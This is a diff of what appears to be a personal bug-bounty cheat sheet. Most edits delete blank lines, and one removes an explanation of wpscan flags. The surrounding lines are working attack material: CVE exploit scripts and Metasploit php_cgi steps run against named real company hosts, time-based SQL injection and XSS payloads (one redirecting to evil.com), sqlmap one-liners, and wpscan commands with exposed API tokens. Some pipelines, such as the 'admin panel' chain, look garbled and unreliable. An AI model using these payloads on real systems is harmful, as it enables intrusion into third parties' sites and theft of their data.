@@ -257,13 +257,10 @@ Uncover Hidden Parameters & Spot XSS in One Go
 arjun -q -u target -oT arjun && cat arjun | awk -F'[?&]' '{baseUrl=$1; for(i=2; i<=NF;
 i++) {split($i, param, "="); print baseUrl "?" param[1] "="}}' | kxss
 
-
 subdominator -d indeed.com -o output-subdominator.txt
-
 
 python3 CVE-2024-40725.py -u https://cnow.apps.ng.cengage.com/
 cat ~/recon/assets/alive.txt | xargs -n 1 -P 10 -I {} python3 'CVE-2024-40898 .py' -u {}
-
 
 msf6> search php_cgi
 > use exploit/multi/http/php_cgi_arg_injection
@@ -271,13 +268,9 @@ msf6> search php_cgi
 > show options
 > exploit
 
-
 https://report.telekom.com/hr-factbook/2023/services/search.html?q=lipon
 https://www.telekom.com/en/search-this-website?query=test
-
-
 https://laboratories.telekom.com/wp-login.php
-
 
 ffuf -w ~/wordlists/Bug-Bounty-Wordlists/wordpress-random.txt -u https://laboratories.telekom.comFUZZ
 
@@ -313,7 +306,6 @@ subfinder -d target -o target && nuclei -t wp-xyz-takeover[.]yaml -l target
 .*\.googleapis\.com
 .*\.pki\.goog
 .*\.mozilla\..*
-
 
 Get the company IPs range X.X.X.X/24
 nmap -p 80,448,8080 IP/24 -oN file.txt 
@@ -370,19 +362,12 @@ https://anmolksachan.github.io/graphql/
 https://github.com/HernanRodriguez1/SharpBruteForceSSH
 
 7 SQLs 
-
 4 in php
-
 (select(0)from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'"+(select(0)from(select(sleep(6)))v)+"*/
-
 1 in aspx
-
 orwa';%20waitfor%20delay%20'0:0:6'%20--%20
-
 2 in graphql
-
 orwa') OR 11=(SELECT 11 FROM PG_SLEEP(6))--
-
 
 admin panel accessed payloda:
 cat urls.txt | qsreplace "?admin=true" | gau | phpgcc | anew | kxss | awk -v -q txt | sed 's/http/\nhttp/g' | grep ^http | sed 's/\(^http[^ <]*\)\(.*\)/\1/g' | grep -vi -e dalfox -e lElLxtainw| sort -u | waybackurls
@@ -714,59 +699,12 @@ opener.location="https://evil.com"
 20) admin-bar.php 
 
 
-
 if you do nomal scan ..wpscan dont catch plugins installed .. i have installed wordpress in my localhost..i also have some vulnnerable plugins installed ...so normal comment is not work.....dont use my token..:D try to get your own in wpscan website for free ..ok
 
 wpscan --url http://10.0.0.227/wordpress/ -e --api-token=hT0T7Lgsh878748x1jg0sQUNKbYJ60Xg712Gosv4VBAm0o --rua -v
 
-
 if you force scan using this comment ...we got it
-
 wpscan --url http://10.0.0.227/wordpress/ -e --api-token=hT0T7Lgsh5gokjvk7QUNKbYJ60Xg712Gosv4VBAm0o --rua -v --disable-tls-checks -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force
-
-    -e:
-    This flag is short for --enumerate. It is used to instruct WPScan to enumerate (gather) various details about the WordPress installation such as users, plugins, themes, and more. Multiple enumerations can be specified by repeating this flag.
-
-    --api-token=hT0T7Lgsh5gox1jg0sQUNKgfgdg44bYJ60Xg712Gosv4VBAm0o:
-    WPScan uses an API to fetch the latest vulnerability data. This flag provides your WPScan API token to authenticate and access the vulnerability database.you can signup wpscan site and get it one...
-
-    --rua:
-    Stands for "Remote User-Agent". This flag helps WPScan send a custom user-agent string when making requests, which can be important for avoiding detection or for bypassing certain security measures. This is generally used to mask the scan’s real identity.
-
-    -v:
-    Stands for verbose mode. This option increases the verbosity of the scan output, providing more detailed information about the process and findings.
-
-    --disable-tls-checks:
-    Disables TLS (Transport Layer Security) checks. This could be useful in cases where SSL/TLS certificates are invalid or self-signed, allowing the scan to proceed without errors related to SSL/TLS issues.
-
-    -e at:
-    This is another enumerate flag but with a specific type of enumeration: at refers to themes. This means WPScan will attempt to list all installed themes on the target WordPress site.
-
-    -e ap:
-    Another enumerate flag, ap stands for plugins. WPScan will attempt to list all active plugins on the site.
-
-    -e u:
-    This is used to enumerate users. WPScan will try to find usernames on the site, which could be valuable information for further attacks (like brute-forcing login credentials).
-
-
-    --plugins-detection aggressive:
-    Specifies the plugin detection method to be aggressive. This means WPScan will use a more in-depth and exhaustive method to identify plugins installed on the WordPress site. This might generate more accurate results, but could also take longer.
-
-    --force:
-    Forces WPScan to continue scanning even if it encounters issues, like SSL/TLS certificate validation errors or problems connecting to the target. This is often used to bypass potential failures or interruptions.
-
-Overall Purpose:
-
-This command is running WPScan to enumerate a range of potential weaknesses in a WordPress installation hosted at http://10.0.0.227/wordpress/. Specifically, it:
-
-    Enumerates themes, plugins, and users.
-    Uses an aggressive plugin detection method.
-    Uses an API token to access updated vulnerability information.
-    Runs in verbose mode for detailed output.
-    Disables TLS checks to avoid certificate-related issues.
-    Forces the scan to run even if certain checks fail.
-
-It’s generally used by security professionals to find vulnerabilities or configuration issues in WordPress installations, or by attackers trying to gather information for potential exploitation.
 
 "Swagger UI" && host=".com"
 
@@ -803,7 +741,6 @@ https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeo
 =======================================================================
 
 Oneliners for SQL Injection 💉 :
-
 $ echo http://<TARGET> | waybackurls › target.txt ; python3 sqlidetector.py -f target.txt
 
 $ subfinder -d http://<TARGET> -silent -all | gau —blacklist ttf,woff,svg,png | sort -u I gf sqli › gf_sqli.txt; sqlmap -m gf_sqli.txt --batch --risk 3 --random-agent | tee -a sqli.txt
@@ -1049,12 +986,9 @@ Tiny XSS Payloads:
  7. If you control the URL:
 <iframe/onload​=eval('’'+URL)>
 
-
 Finding Exploits for public CVEs 🔍
 site:(https://patchstack.com/ | https://wpscan.com | https://wordfence.com) CVE-20xx-xxxxx
 site:(*.github.com | github.com) CVE-20xx-xxxxx
 
 https://github.com/iamunixtz/LazyXss
-
-
 
